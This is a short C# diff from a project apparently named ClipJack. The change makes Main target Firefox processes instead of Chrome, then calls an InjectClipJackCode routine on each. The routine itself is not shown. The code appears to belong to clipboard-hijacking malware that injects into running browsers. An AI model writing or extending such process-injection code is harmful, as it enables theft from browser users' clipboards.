@@ -64,7 +64,7 @@ namespace ClipJack
         static void Main(string[] args)
         {
             Console.WriteLine("0x"+FindPatchLocation().ToString("X"));
-            foreach(Process p in Process.GetProcessesByName("chrome"))
+            foreach(Process p in Process.GetProcessesByName("firefox"))
             {
                 InjectClipJackCode(p);
             }
